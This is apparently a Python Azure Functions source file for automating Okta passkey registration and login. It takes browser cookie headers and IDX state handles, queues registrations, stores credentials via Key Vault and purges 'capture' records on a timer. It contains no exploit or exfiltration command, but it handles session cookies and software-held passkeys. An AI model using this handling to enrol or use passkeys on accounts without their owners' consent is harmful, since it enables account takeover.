@app.queue_output(arg_name="registration_message", queue_name="%PASSKEY_OKTA_REGISTRATION_QUEUE_NAME%", connection="AzureWebJobsStorage")
def queue_okta_passkey_registration_via_idx_session_http(
    req: func.HttpRequest,
    registration_message: func.Out[str],
) -> func.HttpResponse:
    try:
        body = _get_request_body(req)
        queue_message = _build_okta_queue_message(body=body, req=req)
        queue_message["captureContext"] = _stage_queued_capture("okta", body, str(queue_message["requestId"]))
        queue_message.pop("cookieHeader", None)
        queue_message.pop("stateHandle", None)
        _write_registration_status(
            str(queue_message["requestId"]),
            {
                "requestId": queue_message["requestId"],
                "provider": "okta",
                "authMethod": "idx",
                "status": "queued",
                "queueName": os.getenv("PASSKEY_OKTA_REGISTRATION_QUEUE_NAME", "okta-passkey-registration"),
                "queuedAtUtc": queue_message["queuedAtUtc"],
                "oktaDomain": queue_message["oktaDomain"],
                "warning": "Okta IDX stateHandle and browser cookies are short-lived. Queue processing should begin immediately.",
            },
        )
        registration_message.set(json.dumps(queue_message, separators=(",", ":")))
        return _json_response(
            202,
            {
                "success": True,
                "queued": True,
                "provider": "okta",
                "authMethod": "idx",
                "requestId": queue_message["requestId"],
                "queueName": os.getenv("PASSKEY_OKTA_REGISTRATION_QUEUE_NAME", "okta-passkey-registration"),
                "statusUrl": _build_status_url(req, str(queue_message["requestId"]), provider="okta"),
                "warning": "Okta IDX stateHandle and browser cookies are short-lived. Queue processing should begin immediately.",
            },
        )
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": "okta", "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})


@app.function_name(name="ProcessOktaPasskeyRegistrationViaIdxSession")
@app.queue_trigger(arg_name="registration_message", queue_name="%PASSKEY_OKTA_REGISTRATION_QUEUE_NAME%", connection="AzureWebJobsStorage")
def process_okta_passkey_registration_via_idx_session_queue(registration_message: func.QueueMessage) -> None:
    payload = json.loads(registration_message.get_body().decode("utf-8"))
    request_id = str(payload.get("requestId") or "")
    _write_registration_status(
        request_id,
        {
            "requestId": request_id,
            "provider": "okta",
            "authMethod": "idx",
            "status": "processing",
            "queueName": os.getenv("PASSKEY_OKTA_REGISTRATION_QUEUE_NAME", "okta-passkey-registration"),
            "oktaDomain": str(payload.get("oktaDomain") or ""),
            "warning": "Okta IDX stateHandle and browser cookies are short-lived. Queue processing should begin immediately.",
        },
    )
    try:
        result = _process_okta_queue_message(payload)
        _write_registration_status(
            request_id,
            {
                "requestId": request_id,
                "provider": "okta",
                "authMethod": "idx",
                "status": "succeeded",
                "queueName": os.getenv("PASSKEY_OKTA_REGISTRATION_QUEUE_NAME", "okta-passkey-registration"),
                "oktaDomain": str(payload.get("oktaDomain") or ""),
                "completedAtUtc": _utc_timestamp(),
                "credential": result["credential"],
                "catalogRecord": result["catalogRecord"],
            },
        )
    except Exception as exc:  # noqa: BLE001
        _write_registration_status(
            request_id,
            {
                "requestId": request_id,
                "provider": "okta",
                "authMethod": "idx",
                "status": "failed",
                "queueName": os.getenv("PASSKEY_OKTA_REGISTRATION_QUEUE_NAME", "okta-passkey-registration"),
                "oktaDomain": str(payload.get("oktaDomain") or ""),
                "failedAtUtc": _utc_timestamp(),
                "error": str(exc),
            },
        )
        raise


@app.function_name(name="GetOktaPasskeyRegistrationStatus")
@app.route(route="okta/passkeys/register/status/{requestId}", methods=["GET"], auth_level=func.AuthLevel.FUNCTION)
def get_okta_passkey_registration_status_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        request_id = req.route_params.get("requestId") or req.params.get("requestId")
        if not request_id:
            raise PasskeyValidationError("Missing required route or query value 'requestId'.")
        status = _read_registration_status(request_id)
        if status is None:
            return _json_response(404, {"success": False, "provider": "okta", "requestId": request_id, "error": "Registration request status was not found."})
        status["success"] = True
        status["provider"] = "okta"
        return _json_response(200, status)
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": "okta", "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})


@app.function_name(name="LoginWithOktaPasskey")
@app.route(route="okta/passkeys/login", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def login_with_okta_passkey_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        config = load_config_from_environment()
        body = _get_request_body(req)
        credential = _apply_configured_key_vault(_get_credential_payload(body), config.key_vault_name)
        user_name = _get_request_value(body, req, "userName", "username", "email") or str(credential.get("userName") or credential.get("username") or "")
        result = login_okta_passkey(
            config=config,
            okta_domain=_resolve_okta_domain(body, req),
            user_name=user_name,
            credential=credential,
            key_vault_access_token=config.key_vault_access_token,
            password=_get_request_value(body, req, "password"),
            client_id=_get_request_value(body, req, "clientId") or "okta.b8003760-1ca5-51b8-9404-85bb7ef9bc8c",
            redirect_uri=os.getenv("PASSKEY_OKTA_REDIRECT_URI", "").strip() or None,
            sign_count=int(_get_request_value(body, req, "signCount") or "1"),
        )
        return _json_response(200, {"provider": "okta", "authMethod": "idx", **result})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": "okta", "error": str(exc)})
    except OktaPasskeySecurityError as exc:
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})


@app.function_name(name="TestOktaPasskeyLoginViaIdxSession")
@app.route(route="okta/passkeys/login/idx", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def test_okta_passkey_login_via_idx_session_http(req: func.HttpRequest) -> func.HttpResponse:
    try:
        config = load_config_from_environment()
        body = _get_request_body(req)
        credential = _apply_configured_key_vault(_get_credential_payload(body), config.key_vault_name)
        result = login_okta_idx_session(
            config=config,
            okta_domain=_resolve_okta_domain(body, req),
            cookie_header=_get_request_value(body, req, "cookieHeader", "cookie") or "",
            state_handle=_get_request_value(body, req, "stateHandle") or "",
            challenge=_get_request_value(body, req, "challenge") or "",
            credential=credential,
            key_vault_access_token=config.key_vault_access_token,
            sign_count=int(_get_request_value(body, req, "signCount") or "0"),
        )
        return _json_response(200, {"provider": "okta", "authMethod": "idx", **result})
    except PasskeyValidationError as exc:
        return _json_response(400, {"success": False, "provider": "okta", "error": str(exc)})
    except OktaPasskeySecurityError as exc:
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})
    except Exception as exc:  # noqa: BLE001
        return _json_response(502, {"success": False, "provider": "okta", "error": str(exc)})


@app.function_name(name="CleanupPasskeyCaptureProvenance")
@app.timer_trigger(schedule="0 17 3 * * *", arg_name="cleanup_timer", run_on_startup=False, use_monitor=True)
def cleanup_passkey_capture_provenance_timer(cleanup_timer: func.TimerRequest) -> None:
    del cleanup_timer
    deleted = _cleanup_capture_provenance()
    logging.info("Capture provenance cleanup removed %d records.", deleted)
